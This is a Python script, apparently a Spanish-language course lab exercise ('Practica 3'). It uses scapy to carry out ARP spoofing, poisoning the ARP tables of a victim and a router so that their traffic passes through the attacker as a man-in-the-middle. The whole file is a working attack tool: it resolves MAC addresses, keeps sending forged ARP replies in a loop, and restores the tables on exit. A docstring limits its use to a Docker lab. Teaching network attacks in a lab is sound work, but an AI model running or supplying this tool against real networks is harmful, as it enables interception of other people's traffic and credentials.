"""
Practica 3 - ARP Spoofing manual con scapy.

Envenena las tablas ARP de la victima y el router del laboratorio Docker,
haciendo creer a cada uno que la MAC del atacante (esta maquina) corresponde
a la IP del otro extremo. Todo el trafico entre victima y router pasara asi
por el atacante (Man-In-The-Middle).

Uso exclusivo contra el laboratorio Docker de esta practica. Nunca contra
redes ajenas o publicas.
"""

from __future__ import annotations

import argparse
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp


def get_mac(ip: str, iface: str, timeout: int = 3) -> str | None:
    """Resuelve la MAC real de una IP mediante una peticion ARP legitima."""
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(request, timeout=timeout, iface=iface, verbose=0)
    if answered:
        return answered[0][1].hwsrc
    return None


def spoof(target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str, iface: str) -> None:
    """Envia, a nivel de trama Ethernet, una respuesta ARP falsa a target_ip
    diciendo que spoof_ip esta en la MAC del atacante."""
    frame = Ether(dst=target_mac, src=attacker_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac,
    )
    sendp(frame, iface=iface, verbose=0)


def restore(dest_ip: str, dest_mac: str, source_ip: str, source_mac: str, iface: str) -> None:
    """Restaura la entrada ARP real (usado al terminar, para no dejar la red envenenada)."""
    frame = Ether(dst=dest_mac, src=source_mac) / ARP(
        op=2,
        pdst=dest_ip,
        hwdst=dest_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    sendp(frame, count=4, iface=iface, verbose=0)


def main() -> None:
    parser = argparse.ArgumentParser(description="ARP Spoofer manual (Practica 3 - laboratorio Docker)")
    parser.add_argument("--victim", required=True, help="IP de la victima")
    parser.add_argument("--router", required=True, help="IP del router")
    parser.add_argument("--iface", required=True, help="Interfaz de red (ej. br-xxxxxxxxxxxx)")
    parser.add_argument("--interval", type=float, default=2.0, help="Segundos entre reenvios de veneno")
    args = parser.parse_args()

    attacker_mac = get_if_hwaddr(args.iface)
    print(f"[*] MAC del atacante en {args.iface}: {attacker_mac}")

    print(f"[*] Resolviendo MAC real de la victima ({args.victim})...")
    victim_mac = get_mac(args.victim, args.iface)
    print(f"[*] Resolviendo MAC real del router ({args.router})...")
    router_mac = get_mac(args.router, args.iface)

    if not victim_mac or not router_mac:
        print("[!] No se pudo resolver alguna MAC. Aborta.")
        sys.exit(1)

    print(f"[+] Victima {args.victim} -> {victim_mac}")
    print(f"[+] Router  {args.router} -> {router_mac}")
    print(f"[*] Iniciando envenenamiento ARP (Ctrl+C para detener y restaurar)...\n")

    try:
        packets_sent = 0
        while True:
            # Enganamos a la victima: "el router esta en mi MAC"
            spoof(args.victim, victim_mac, args.router, attacker_mac, args.iface)
            # Enganamos al router: "la victima esta en mi MAC"
            spoof(args.router, router_mac, args.victim, attacker_mac, args.iface)
            packets_sent += 2
            print(f"\r[*] Paquetes ARP falsos enviados: {packets_sent}", end="", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] Deteniendo y restaurando tablas ARP reales...")
        restore(args.victim, victim_mac, args.router, router_mac, args.iface)
        restore(args.router, router_mac, args.victim, victim_mac, args.iface)
        print("[+] ARP restaurado. Saliendo.")


if __name__ == "__main__":
    main()
